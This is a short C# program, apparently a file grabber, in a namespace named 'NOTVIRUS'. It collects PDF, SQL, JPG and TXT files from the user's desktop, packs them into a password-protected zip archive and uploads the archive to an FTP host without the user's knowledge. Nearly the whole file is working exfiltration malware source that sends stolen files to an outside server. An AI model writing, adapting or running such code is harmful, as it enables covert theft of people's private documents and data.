using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Collections;
using Ionic.Zip;
using System.Net;


namespace NOTVIRUS
{
    class Gr
    {
        public static void Grb()
        {
            
            string dir = @"D:/Gr"; //path to a new catalog
            DirectoryInfo direct = new DirectoryInfo(dir); //create an instance of the DirectoryInfo class
            if (!direct.Exists) //if the folder does not exist, then create it
            {
                direct.Create(); 
            }

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //path to desktop
            string[] file = Directory.GetFiles(path); //create an array of all desktop files
            List<string>files = new List<string>();  //create a list of the files we need
            List<string> nfile = new List<string>(); //list of filenames
            foreach (string i in file)
            {
                string ext = Path.GetExtension(i); //check the desktop for files with the pdf sql jpg txt extension and add them to the files list
                if (ext == ".pdf" || ext == ".sql" || ext == ".jpg" || ext == ".txt")
                {
                    files.Add(i);
                }
            }
            foreach (string i in file)
            {
                nfile.Add(Path.GetFileName(i)); //add filenames to nfile list
            }
            for (int i = 0; i < files.Count; i++)
            {
                File.Copy(files[i],dir+"/"+nfile[i]); //copy the files to the Gr catalog
            }

            using (ZipFile zipfile = new ZipFile(Encoding.GetEncoding("utf-8"))) //create an archive
            {
                zipfile.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression; //set the maximum compression level
                zipfile.Password = "passwd"; //archive password
                zipfile.AddDirectory(@"" + dir); //add all files from the Gr folder to the archive
                zipfile.Save(@"" + dir + "/ing.zip"); //save the archive 'ing.zip' - the name of the archive
            }

        }
    }
    class FTP
    {
        public static void Ftp()
        {
            string host = "ftp://host.com";
            string login = "login";
            string pass = "passwd";
            FileInfo uploadf = new FileInfo("ing.zip");
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://host.com" + uploadf.Name);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential(login, pass);
            Stream ftpStream = request.GetRequestStream();
            FileStream fileStream = File.OpenRead("D:/Gr/ing.zip");
            byte[] buffer = new byte[1024];
            int bytesRead = 0;
            do
            {
                bytesRead = fileStream.Read(buffer, 0, 1024);
                ftpStream.Write(buffer, 0, bytesRead);
            }
            while (bytesRead != 0);
            fileStream.Close();
            ftpStream.Close();
        }
    }
    class Program
    {
       static void Main(string[] args)
        {
            Gr.Grb();
            FTP.Ftp();
        }
    }
}
